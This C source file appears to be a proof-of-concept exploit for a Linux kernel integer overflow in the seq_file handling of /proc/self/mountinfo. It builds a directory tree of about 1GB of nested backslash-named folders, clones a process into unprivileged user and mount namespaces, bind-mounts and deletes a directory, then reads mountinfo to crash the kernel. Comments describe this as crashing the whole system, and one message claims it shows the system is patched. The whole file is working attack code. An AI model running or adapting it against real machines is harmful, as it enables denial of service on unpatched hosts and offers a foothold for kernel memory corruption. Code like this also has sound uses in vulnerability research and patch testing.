#define _GNU_SOURCE
#include "my_crasher.h"
#include <stdio.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>

//the attacker's process's function
static int
attacker_fn(void * const arg)
{
    if (!arg) return -1;
    const t_userns * const userns = arg;
    const int sock = userns->socks[1];
    if (close(userns->socks[0])) return -1;

    //The attacker thread will wait the flag '1' from main thread upon wake up
    //flag '1' means the the deep directory is created. 
    send_then_wait(sock, NULL, '1');

    size_t n;
    if (chdir(long_path)) return -1;
    for (n = 0; n <= userns->count / (1 + (sizeof(name_buff)-1) * 4); n++) {
        if (chdir(name_buff)) return -1;
    }
    //bind mount a temp directory
    char device[] = "./device.XXXXXX";
    if (!mkdtemp(device)) return -1;
    char mpoint[] = "/tmp/mpoint.XXXXXX";
    if (!mkdtemp(mpoint)) return -1;
    if (mount(device, mpoint, NULL, MS_BIND, NULL)) return -1;

    //delete the directory to add a "//deleted" mark in seq_file's record
    if (userns->delete) {
        if (rmdir(device)) return -1;
    }
    if (chdir("/")) return -1;

    
    send_then_wait(sock, "2", '3');

    //step 3: now start crashing the whole system! 
    const int fd = open("/proc/self/mountinfo", O_RDONLY);


    if (fd <= -1) return -1;
    static char buf[1UL << 20];
    size_t len = 0;

    //step 4: an unpatched system will crash at this point.
    //We survived the crash. Now we check if the long path really exist. 
    while (1) {
        ssize_t nbr = read(fd, buf, 1024);
        if (nbr <= 0) return -1;
        while (1) {
            char * nl = memchr(buf, '\n', nbr);
            if (!nl) break;
            nl++;
            if (memmem(buf, nl - buf, "\\134", 4)) return -1;
            nbr -= nl - buf;
            memmove(buf, nl, nbr);
            len = 0;
        }
        len += nbr;
        if (memmem(buf, nbr, "\\134", 4)) break;
    }

    //Now 
    send_then_wait(sock, "4", '5');
    return 0;
}

//step 2: create a process with unpriviledged user namespace, new stack and inherited gid_map, user_map.
static void
create_attacker(t_userns * const userns, const size_t size, const int delete)
{
    static const size_t stack_size = (1UL << 20) + 2 * PAGE_SIZE;
    static char * stack = NULL;
    if (!stack) {
        stack = mmap(NULL, stack_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (!stack || stack == MAP_FAILED) return;
        if (mprotect(stack + PAGE_SIZE, stack_size - 2 * PAGE_SIZE, PROT_READ | PROT_WRITE)) return;
    }

    if (!userns) return;
    userns->count = size / 2;
    userns->delete = delete;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, userns->socks)) return;
    userns->pid = clone(attacker_fn, stack + stack_size - PAGE_SIZE, CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, userns);
    if (userns->pid <= -1) return;
    if (close(userns->socks[1])) return;
    userns->socks[1] = -1;

    char map_path[64], map_buf[64];
    snprintf(map_path, sizeof(map_path), "/proc/%ld/uid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getuid());
    update_id_map(map_buf, map_path);

    proc_setgroups_write(userns->pid, "deny");
    snprintf(map_path, sizeof(map_path), "/proc/%ld/gid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getgid());
    update_id_map(map_buf, map_path);
}

int main(const int argc, const char * const argv[])
{
    if (argc != 2) {
        printf("Usage: mkdir dir; %s $(pwd)/dir", argv[0]);
        return -1;
    }

    const char *longPath = argv[1];

    if (*longPath != '/') {
        printf("Usage: mkdir dir; %s $(pwd)/dir", argv[0]);
        return -1;
    }
    
    memset(name_buff, '\\', sizeof(name_buff) - 1);

    if (name_buff[sizeof(name_buff) - 1] != '\0') {
        return -1;
    }

    printf("Generating 2GB path name...\n");

    mkdir(longPath, S_IRWXU);
    chdir(longPath);
    //step 1: create a deep directory
    //note that the path name "\\"" in mountinfo will be replaced by "\\134", whose length is 4 byte. So we only need to create 1GB/NAME_MAX*4 inodes (NAME_MAX is 255).
    for (size_t i = 0; i <= (1UL << 30) / (1 + (sizeof(name_buff) - 1) * 4); i++)
    {
        mkdir(name_buff, S_IRWXU);   
        chdir(name_buff);
    }

    chdir("/");
    static t_userns userns;
    unsigned long overflow_int = 1UL + INT_MAX;
    //step 2: create a process with unpriviledged user namespace, new stack and inherited gid_map, user_map.
    create_attacker(&userns, overflow_int, 1);
    send_then_wait(*userns.socks, "1", '2');

    //step 3: trigger the bug to crash whole system, check the attacker_fn() for detailed info.
    printf("Start crashing system...\n");
    send_then_wait(*userns.socks, "3", '4');

    //clean up the cloned process and namespace
    clean_up(&userns);

    printf("Crash failed. The system has already been patched!\n");
    return 0;
}

